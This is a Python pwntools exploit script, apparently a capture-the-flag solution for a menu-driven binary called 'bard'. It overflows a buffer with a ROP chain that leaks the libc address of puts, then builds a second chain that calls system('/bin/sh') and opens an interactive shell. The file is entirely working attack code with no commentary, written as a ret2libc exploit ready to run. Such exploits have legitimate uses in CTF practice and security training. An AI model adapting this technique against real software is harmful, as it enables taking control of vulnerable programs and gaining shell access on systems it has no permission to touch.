#!/usr/bin/env python2
from pwn import *

exe = ELF("./bard")
libc = ELF("/usr/lib/libc.so.6")
context.binary = exe
context.terminal = "kitty sh -c".split()
#context.log_level = "debug"

global io
breakpoints = '''
break *0x40107b
break *0x400f7c
break *0x400eb7
break *0x4008dc
break *0x400857
break *0x400a84
break *0x400df4
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

puts_got = exe.got['puts']
puts_plt = exe.plt['puts']
puts_offset = libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search("/bin/sh"))

pop_rdi = 0x401143
main = 0x40107b

def evil(x):
    reu("l):")
    sl("e")
    reu("nt")
    sl("1")
    reu("e:")
    sl(x)

def good(x,nl="\n"):
    reu("l):")
    sl("g")
    reu("cy")
    sl("1")
    reu("e:")
    s(x+nl)

def run():
    reu("un")
    sl("r")

def send_payload(pyld):
    for i in range(7):
        evil("A")

    good("B")
    evil("C")
    good(pyld,"")

    for j in range(10):
        run()

payload = flat([
    pop_rdi,puts_got,
    puts_plt,
    main
])
send_payload(payload)

reu("away.\n")
libc_leak = unpack(rl(),48)-puts_offset
log.info("Libc leak -> "+hex(libc_leak))

payload = flat([
    pop_rdi,libc_leak+bin_sh,
    libc_leak+system
])
send_payload(payload)
reu("away.\n")

io.interactive()